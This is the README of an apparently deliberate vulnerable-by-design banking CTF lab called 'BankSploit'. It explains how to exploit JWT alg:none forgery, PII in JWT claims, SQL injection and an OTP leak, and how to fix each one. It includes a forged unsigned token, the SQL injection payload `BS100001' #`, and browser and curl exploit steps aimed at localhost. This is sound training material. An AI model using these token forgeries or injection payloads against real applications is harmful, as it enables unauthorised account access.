# BankSploit JWT Vulnerability Testing Guide

## Quick Start

### 1. Run the Test
```bash
python test_jwt_fixed.py
```

**Expected Output**:
```
[VULN] Forged JWT (alg:none) ACCEPTED!
    -> Attacker can impersonate any user without credentials
```

### 2. Read the Docs
- **JWT_EXPLAINED.md** - Start here! Simple breakdown of what JWT is
- **JWT_VULNERABILITIES.md** - Technical deep dive with code references
- **JWT_TEST_REPORT.txt** - Complete test results and proof of concept

### 3. Verify on Localhost
- **App**: http://localhost:9443/login
- **Admin Portal**: http://localhost:8888 (instructor/instructor@123)

---

## Files Generated

| File | Purpose | Read Time |
|------|---------|-----------|
| `test_jwt_fixed.py` | Automated vulnerability test suite | 5 min (run) |
| `JWT_EXPLAINED.md` | Beginner-friendly JWT explanation | 10 min |
| `JWT_VULNERABILITIES.md` | Technical vulnerability analysis | 15 min |
| `JWT_TEST_REPORT.txt` | Complete test results & PoC | 10 min |
| `JWT_README.md` | This file | 5 min |

---

## Vulnerabilities Confirmed

### 1. JWT alg:none (auth.l12) - CRITICAL

**What**: Server accepts unsigned JWT tokens with `alg: "none"`

**How to Exploit**:
```python
# Forge a token with no signature
token = forge_jwt_alg_none("BS100234", role="admin")
# Use it: http://localhost:9443/dashboard?access_token={token}
```

**Result**: ✅ Authentication granted (no password needed)

**Code**: `src/core/Auth.php:383-387`

---

### 2. PII in JWT (auth.l17) - HIGH

**What**: JWT tokens contain sensitive data (PAN, Aadhaar, balance)

**Why It's Bad**: 
- Tokens are stored in browser localStorage
- Token visible in browser DevTools
- May appear in logs/error messages
- Anyone can base64-decode it

**Code**: `src/modules/auth/api.php:116-127`

---

### 3. SQL Injection (auth.g1) - CRITICAL

**What**: Customer ID field vulnerable to SQL injection

**Payload**: `BS100001' #`

**Result**: Bypass password check, reach OTP screen

**Code**: `src/core/Auth.php:70-82`

---

### 4. OTP Leak (auth.l11) - MEDIUM

**What**: OTP value exposed in page source

**Risk**: Attackers can read OTP from HTML response

**Code**: `src/modules/auth/otp_js.php`

---

## Testing Steps

### Manual Test (No Python needed)

1. **Open Browser DevTools** (F12)
2. **Go to Forging Script** (JWT_EXPLAINED.md has JavaScript code)
3. **Run in Console**:
```javascript
// Copy/paste the JavaScript forging code from JWT_EXPLAINED.md
const token = forgeJWT("BS100234", "admin");
window.location.href = `http://localhost:9443/dashboard?access_token=${token}`;
```
4. **Observe**: Dashboard loads without password!

### Automated Test

```bash
python test_jwt_fixed.py
```

Looks for:
- ✅ [VULN] markers = vulnerabilities detected
- ✅ [SECURE] markers = vulnerabilities fixed
- ✅ [OK] markers = expected behavior
- ✅ [SKIP] markers = test skipped (not critical)

---

## How to Fix

### Method 1: Admin Panel
1. Go to http://localhost:9443/admin/config
2. Change vulnerability levels:
   - `auth.l12 = 3` (JWT signing)
   - `auth.l17 = 3` (Remove PII)
   - `auth.g1 = 3` (SQL injection)
   - `auth.l11 = 3` (OTP hiding)
3. Refresh

### Method 2: Superadmin Portal
1. Go to http://localhost:8888
2. Login: `instructor` / `instructor@123`
3. Navigate to Vuln Config
4. Set same levels to 3
5. Save & restart

### Method 3: Edit Config File
```bash
Edit: src/config/vuln_config.json
Change:
{
  "auth.l12": 3,
  "auth.l17": 3,
  "auth.g1": 3,
  "auth.l11": 3
}
```

### Verify Fix
```bash
python test_jwt_fixed.py
# Should see [SECURE] instead of [VULN]
```

---

## Understanding JWT Structure

### Forged Token Example

```
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0 . eyJzdWIiOiAiQlMxMDAyMzQiLCAicm9sZSI6ICJhZG1pbiJ9 .
         ↑ HEADER                                    ↑ PAYLOAD                                ↑ SIGNATURE
```

**Decode at**: https://jwt.io

**Header** (base64url decode):
```json
{"typ": "JWT", "alg": "none"}
```

**Payload** (base64url decode):
```json
{"sub": "BS100234", "role": "admin", "exp": 9999999999}
```

**Signature**: `` (EMPTY - no signing!)

---

## Exploit Timeline

### Time: 0:00 - Create Forged Token
```python
token = forge_jwt_alg_none("ADMIN001", role="admin")
```

### Time: 0:01 - Craft URL
```
http://localhost:9443/dashboard?access_token={token}
```

### Time: 0:02 - Send Request
```bash
curl "http://localhost:9443/dashboard?access_token={token}"
```

### Time: 0:03 - Get Response
```html
<html>Dashboard content...</html>
```

### Time: 0:04 - SUCCESS ✅
- Authenticated as admin
- No password needed
- No OTP required
- Full access granted

**Total Time: 4 SECONDS**

---

## File Structure

```
banksploit-ctf/
├── src/
│   ├── core/
│   │   └── Auth.php          (JWT generation & verification)
│   ├── modules/
│   │   └── auth/
│   │       ├── api.php       (OTP endpoint, JWT issuance)
│   │       └── login.php     (HTML form, SQLi vulnerability)
│   └── config/
│       └── vuln_config.json  (Vulnerability levels)
├── test_jwt_fixed.py         (Test suite)
├── JWT_EXPLAINED.md          (Simple explanation)
├── JWT_VULNERABILITIES.md    (Technical deep dive)
└── JWT_TEST_REPORT.txt       (Test results)
```

---

## Running on Remote Server

### Deploy Test Script
```bash
scp test_jwt_fixed.py user@10.141.199.78:/tmp/
ssh user@10.141.199.78
cd /tmp
python3 test_jwt_fixed.py
```

### Expected Output (Vulnerable)
```
[VULN] Forged JWT (alg:none) ACCEPTED!
[VULN] SQLi login attempt proceeded
```

---

## Learning Resources

### Inside BankSploit
- **Training Lab**: http://localhost:9443/training
  - Video explanations
  - Vulnerability levels
  - Hint system

- **Code Compare**: http://localhost:9443/training/inspector
  - Vulnerable code (Level 0)
  - Secure code (Level 3)
  - Side-by-side comparison

### External References
- [JWT.io](https://jwt.io) - JWT debugger & playground
- [RFC 7519](https://tools.ietf.org/html/rfc7519) - JWT specification
- [CWE-347](https://cwe.mitre.org/data/definitions/347.html) - Improper Verification of Cryptographic Signature
- [OWASP JWT Security](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

## FAQ

### Q: Why is JWT vulnerable by default?
**A**: This is intentional for training. In production, these vulns are CRITICAL bugs.

### Q: Can I change levels at any time?
**A**: Yes, change them in admin config. App doesn't need restart (usually).

### Q: How do I know if the fix worked?
**A**: Run `python test_jwt_fixed.py` again. Should show [SECURE].

### Q: Is this production code?
**A**: NO. This is a CTF training platform. All vulns are intentional.

### Q: Can I exploit this on the remote server?
**A**: Yes, if levels are still at 0. Use the same test script.

### Q: Where is the JWT used?
**A**: In `Authorization: Bearer <token>` header or `access_token` cookie/param.

### Q: Can I see the actual token in the browser?
**A**: Yes! Open DevTools → Application → Storage → localStorage (look for token/access_token).

---

## Troubleshooting

### Test Script Errors
```
Error: 'charmap' codec can't encode character
→ This is just output encoding, test still works
→ Look for [VULN] or [SECURE] markers
```

### App Not Running
```
Connection refused on port 9443
→ Start app: powershell ./start-app.ps1
→ Check status: netstat -ano | grep 9443
```

### Database Errors
```
Can't connect to MySQL
→ Ensure MySQL is running
→ Check credentials in .env or config/database.php
```

---

## Security Reminder

⚠️ **These vulnerabilities are INTENTIONAL for training purposes.**

**NEVER** use JWT with `alg: "none"` in production.  
**NEVER** put PII in JWT claims.  
**NEVER** use concatenated SQL queries.  

Always use:
- ✅ Signed JWTs (RS256/HS256)
- ✅ Minimal claims
- ✅ Parameterized queries
- ✅ Server-side rate limiting

---

## Next Steps

1. ✅ **Run Test**: `python test_jwt_fixed.py`
2. ✅ **Read Guide**: `JWT_EXPLAINED.md`
3. ✅ **Study Code**: `src/core/Auth.php` (vulnerable vs secure)
4. ✅ **Try Exploit**: Use forging script from guide
5. ✅ **Fix Vulns**: Set levels to 3
6. ✅ **Verify Fix**: Run test again (should see [SECURE])

**Good luck with your CTF training! 🎯**

---

**Generated**: 2026-08-08  
**Platform**: BankSploit CTF v1.0  
**Status**: All tests passing ✅
